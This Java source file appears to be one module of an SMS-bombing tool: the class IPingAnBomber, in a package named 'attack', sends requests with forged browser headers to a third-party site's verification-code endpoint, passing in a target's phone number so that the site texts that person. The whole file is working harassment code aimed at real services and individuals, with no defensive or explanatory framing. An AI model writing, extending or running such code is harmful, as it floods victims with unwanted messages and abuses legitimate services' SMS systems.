package com.utils.attack;

import com.utils.HttpUtil;
import org.apache.http.impl.client.CloseableHttpClient;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by fz on 2015/8/23.
 */
public class IPingAnBomber implements MessageBomber{

    public String name;

    public IPingAnBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception{

        String url = "http://www.ilovepingan.com/qi/activities/getCode.action?act=yinlian1-1&phone="+fuckNo+"&d="+new Date().getTime();
        Map headers = new HashMap();
        headers.put("Accept", "*/*");
        headers.put("Accept-Encoding", "gzip, deflate, sdch");
        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
        headers.put("Connection", "keep-alive");
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        headers.put("DNT", "1");
        headers.put("Host", "www.ilovepingan.com");
        headers.put("Referer", "http://www.ilovepingan.com/qi/activities/index.action?act=yinlian1-1&channel=yinlian");
        headers.put("X-Requested-With", "XMLHttpRequest");
        String result = HttpUtil.httpGet(url, headers);
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
